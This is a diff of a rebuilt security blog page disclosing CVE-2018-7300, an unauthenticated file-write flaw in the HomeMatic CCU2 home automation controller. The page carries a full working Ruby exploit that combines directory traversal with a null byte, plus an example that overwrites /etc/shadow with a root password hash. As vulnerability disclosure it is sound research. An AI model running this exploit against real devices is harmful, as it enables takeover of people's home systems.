@@ -3,15 +3,6 @@
 	
 	<link href="//gmpg.org/xfn/11" rel="profile">
 	<meta http-equiv="content-type" content="text/html; charset=utf-8">
-	<link rel="canonical" href="http://atomic111.github.io/article/homematic-ccu2-filewrite" />
-	<meta name="description" content="# Background HomeMatic is a home automation system consisting of various components for automating several parts of a building, including..." />
-	<meta property="og:description" content="# Background HomeMatic is a home automation system consisting of various components for automating several parts of a building, including..." />
-	<meta itemprop="image" content="http://atomic111.github.io/assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg" />
-	<meta property="og:image" content="http://atomic111.github.io/assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg" />
-	<meta property="og:title" content="CVE-2018-7300: Arbitrary File Upload / Remote Code Execution in HomeMatic CCU2" />
-	<meta property="og:type" content="article" />
-	<meta property="og:url" content="http://atomic111.github.io/article/homematic-ccu2-filewrite" />
-	<meta property="og:site_name" content="Patrick Münch Blog" />
 	<title>CVE-2018-7300: Arbitrary File Upload / Remote Code Execution in HomeMatic CCU2 &middot; Patrick Münch Blog</title>
 	<meta name="mobile-web-app-capable" content="yes">
 	<meta name="HandheldFriendly" content="True" />
@@ -22,9 +13,9 @@
 	<link href="/assets/css/genericons.css" type="text/css" rel="stylesheet" />
 	<link href="/assets/css/syntax.css" type="text/css" rel="stylesheet" />
 	<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Fenix:400,400italic">
-	<link rel="apple-touch-icon" href="http://atomic111.github.io/assets/images/logo.jpeg">
-	<link rel="shortcut icon" href="http://atomic111.github.io/assets/images/favicon.ico">
-	<link rel="alternate" type="application/rss+xml" title="RSS" href="http://atomic111.github.io/atom.xml">
+	<link rel="apple-touch-icon" href="http://localhost:4000/assets/images/logo.jpeg">
+	<link rel="shortcut icon" href="http://localhost:4000/assets/images/favicon.ico">
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">
 	<script type="text/javascript" src="/assets/js/jquery-2.1.0.min.js"></script>
 	
 	<script type="text/javascript" src="/assets/js/jquery.stellar.min.js"></script>
@@ -95,35 +86,34 @@
 
 <p>The system provides a JSON API, which exposes various methods. While some methods require the connecting user to be authenticated, a number of methods can also be used anonymously.</p>
 
-<p>A code review of the file <code>api/methods/user/setlanguage.tcl</code> revealed that the User.setLanguage method, which can be used without authentication, is prone to a Directory Traversal vulnerability. Please consider the following excerpt from the affected code:</p>
+<p>A code review of the file <code class="highlighter-rouge">api/methods/user/setlanguage.tcl</code> revealed that the User.setLanguage method, which can be used without authentication, is prone to a Directory Traversal vulnerability. Please consider the following excerpt from the affected code:</p>
 
-<p><code>
-exec echo $args(userLang)&gt;/etc/config/userprofiles/$args(userName).lang
-</code></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec echo $args(userLang)&gt;/etc/config/userprofiles/$args(userName).lang
+</code></pre></div></div>
 
 <p>This means that an attacker can create or overwrite arbitrary files on the CCU2’s filesystem. Please note that full control over the target file name can be obtained by injecting a null byte into the userName argument in order to prevent the string “.lang” from being appended to the resulting file name. The file contents can be directly controlled via the userLang argument.</p>
 
 <h1 id="proof-of-concept">Proof-of-Concept</h1>
 
-<pre><code class="language-ruby">#!/usr/bin/ruby
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/ruby</span>
 
-# Exploit Title: Homematic CCU2 Arbitrary File Write
-# Date: 28-03-18
-# Exploit Author: Patrick Muench (SVA System Vertrieb Alexander GmbH), Gregor Kopf (Secfault Security GmbH)
-# Vendor Homepage: http://www.eq-3.de
-# Software Link: http://www.eq-3.de/service/downloads.html?id=268
-# Version: 2.29.23
-# CVE : 2018-7300
+<span class="c1"># Exploit Title: Homematic CCU2 Arbitrary File Write</span>
+<span class="c1"># Date: 28-03-18</span>
+<span class="c1"># Exploit Author: Patrick Muench (SVA System Vertrieb Alexander GmbH), Gregor Kopf (Secfault Security GmbH)</span>
+<span class="c1"># Vendor Homepage: http://www.eq-3.de</span>
+<span class="c1"># Software Link: http://www.eq-3.de/service/downloads.html?id=268</span>
+<span class="c1"># Version: 2.29.23</span>
+<span class="c1"># CVE : 2018-7300</span>
 
-# Description: http://atomic111.github.io/article/homematic-ccu2-filewrite
+<span class="c1"># Description: http://atomic111.github.io/article/homematic-ccu2-filewrite</span>
 
-require 'net/http'
-require 'net/https'
-require 'uri'
-require 'json'
+<span class="nb">require</span> <span class="s1">'net/http'</span>
+<span class="nb">require</span> <span class="s1">'net/https'</span>
+<span class="nb">require</span> <span class="s1">'uri'</span>
+<span class="nb">require</span> <span class="s1">'json'</span>
 
-unless ARGV.length == 3
-  STDOUT.puts &lt;&lt;-EOF
+<span class="k">unless</span> <span class="no">ARGV</span><span class="p">.</span><span class="nf">length</span> <span class="o">==</span> <span class="mi">3</span>
+  <span class="no">STDOUT</span><span class="p">.</span><span class="nf">puts</span> <span class="o">&lt;&lt;-</span><span class="no">EOF</span><span class="sh">
 Please provide url
 
 Usage:
@@ -136,57 +126,57 @@ Example:
 
   write_files.rb http://192.168.1.1 '/etc/shadow' 'root:$1$DsoAgNYx$BSSQ9cLv0DLLknpqztgdd/:19087:0:99999:7:::'
 
-EOF
-  exit
-end
+</span><span class="no">EOF</span>
+  <span class="nb">exit</span>
+<span class="k">end</span>
 
-# The first argument specifies the URL and if http or https is used
-url = ARGV[0] + "/api/homematic.cgi"
+<span class="c1"># The first argument specifies the URL and if http or https is used</span>
+<span class="n">url</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"/api/homematic.cgi"</span>
 
-# The second argument specifies the file into which the content should be written
-homematic_file_path = ARGV[1]
+<span class="c1"># The second argument specifies the file into which the content should be written</span>
+<span class="n">homematic_file_path</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
 
-# The third argument specifies the content of the file
-homematic_file_content = ARGV[2]
+<span class="c1"># The third argument specifies the content of the file</span>
+<span class="n">homematic_file_content</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
 
-# define the json body for the attack
-body = {
-        "version": "1.1",
-        "method": "User.setLanguage",
-        "params": {
-                    "userName": "file path",
-                    "userLang": "file content"
-                  }
-        }.to_hash
+<span class="c1"># define the json body for the attack</span>
+<span class="n">body</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">"version"</span><span class="p">:</span> <span class="s2">"1.1"</span><span class="p">,</span>
+        <span class="s2">"method"</span><span class="p">:</span> <span class="s2">"User.setLanguage"</span><span class="p">,</span>
+        <span class="s2">"params"</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="s2">"userName"</span><span class="p">:</span> <span class="s2">"file path"</span><span class="p">,</span>
+                    <span class="s2">"userLang"</span><span class="p">:</span> <span class="s2">"file content"</span>
+                  <span class="p">}</span>
+        <span class="p">}.</span><span class="nf">to_hash</span>
 
-# define the traversal with the file you want to write
-body[:params][:userName] = "../../../../../../../.." + homematic_file_path + "\u0000"
+<span class="c1"># define the traversal with the file you want to write</span>
+<span class="n">body</span><span class="p">[</span><span class="ss">:params</span><span class="p">][</span><span class="ss">:userName</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"../../../../../../../.."</span> <span class="o">+</span> <span class="n">homematic_file_path</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\u</span><span class="s2">0000"</span>
 
-# define the content
-body[:params][:userLang] = homematic_file_content
+<span class="c1"># define the content</span>
+<span class="n">body</span><span class="p">[</span><span class="ss">:params</span><span class="p">][</span><span class="ss">:userLang</span><span class="p">]</span> <span class="o">=</span> <span class="n">homematic_file_content</span>
 
-# split the uri to access it in a easier way
-uri = URI.parse(url)
+<span class="c1"># split the uri to access it in a easier way</span>
+<span class="n">uri</span> <span class="o">=</span> <span class="no">URI</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
 
-# define target connection, disabling certificate verification
-Net::HTTP.start(uri.host, uri.port, :use_ssl =&gt; uri.scheme == 'https', :verify_mode =&gt; OpenSSL::SSL::VERIFY_NONE) do |http|
+<span class="c1"># define target connection, disabling certificate verification</span>
+<span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">start</span><span class="p">(</span><span class="n">uri</span><span class="p">.</span><span class="nf">host</span><span class="p">,</span> <span class="n">uri</span><span class="p">.</span><span class="nf">port</span><span class="p">,</span> <span class="ss">:use_ssl</span> <span class="o">=&gt;</span> <span class="n">uri</span><span class="p">.</span><span class="nf">scheme</span> <span class="o">==</span> <span class="s1">'https'</span><span class="p">,</span> <span class="ss">:verify_mode</span> <span class="o">=&gt;</span> <span class="no">OpenSSL</span><span class="o">::</span><span class="no">SSL</span><span class="o">::</span><span class="no">VERIFY_NONE</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">http</span><span class="o">|</span>
 
-  # define post request
-  request = Net::HTTP::Post.new(uri.request_uri)
+  <span class="c1"># define post request</span>
+  <span class="n">request</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">::</span><span class="no">Post</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">uri</span><span class="p">.</span><span class="nf">request_uri</span><span class="p">)</span>
 
-  # define the content type of the http request
-  request.content_type = 'application/json'
+  <span class="c1"># define the content type of the http request</span>
+  <span class="n">request</span><span class="p">.</span><span class="nf">content_type</span> <span class="o">=</span> <span class="s1">'application/json'</span>
 
-  # define the request body
-  request.body = body.to_json
+  <span class="c1"># define the request body</span>
+  <span class="n">request</span><span class="p">.</span><span class="nf">body</span> <span class="o">=</span> <span class="n">body</span><span class="p">.</span><span class="nf">to_json</span>
 
-  # send the request to the homematic ccu2
-  response = http.request(request)
+  <span class="c1"># send the request to the homematic ccu2</span>
+  <span class="n">response</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="nf">request</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
 
-  # print response message code and status to cli
-  puts 'Response code: ' + response.code + ' ' + response.message
-end
-</code></pre>
+  <span class="c1"># print response message code and status to cli</span>
+  <span class="nb">puts</span> <span class="s1">'Response code: '</span> <span class="o">+</span> <span class="n">response</span><span class="p">.</span><span class="nf">code</span> <span class="o">+</span> <span class="s1">' '</span> <span class="o">+</span> <span class="n">response</span><span class="p">.</span><span class="nf">message</span>
+<span class="k">end</span>
+</code></pre></div></div>
 
 <h1 id="cve">CVE</h1>
 
@@ -216,7 +206,7 @@ end
 		
 	
 	<script src="https://apis.google.com/js/plusone.js"></script>
-	<div id="g-comments" class="g-comments" data-href="http://atomic111.github.io/article/homematic-ccu2-filewrite" data-width="700" data-first_party_property="BLOGGER" data-view_type="FILTERED_POSTMOD"></div>
+	<div id="g-comments" class="g-comments" data-href="http://localhost:4000/article/homematic-ccu2-filewrite" data-width="700" data-first_party_property="BLOGGER" data-view_type="FILTERED_POSTMOD"></div>
 	<script>
 		var width = $('#comments').width() * 0.9;
 		width = Math.round(width);
@@ -237,13 +227,6 @@ end
 	</div>
 </div>
 
-	
-	
-	
-	
-	
-	
-
 
 <footer class="clean" style="background-image: url(/assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg); height: 75%; min-height: 500px; " data-stellar-background-ratio="0.5" data-stellar-horizontal-offset="50" data-stellar-vertical-offset="50">
 	<div id="nav-icon" style="top: 60px;" data-stellar-ratio="0.8">
@@ -258,7 +241,7 @@ end
 			
 		</a>
 	</div>
-	<p class="copyright">&copy;2018, <a href="http://atomic111.github.io" target="_blank">Patrick Münch</a>. <a href="" target="_blank">All rights reserved</a>.</p>
+	<p class="copyright">&copy;2019, <a href="http://atomic111.github.io" target="_blank">Patrick Münch</a>. <a href="" target="_blank">All rights reserved</a>.</p>
 </footer>
 <script src="/assets/js/smooth-scroll.js"></script>
 
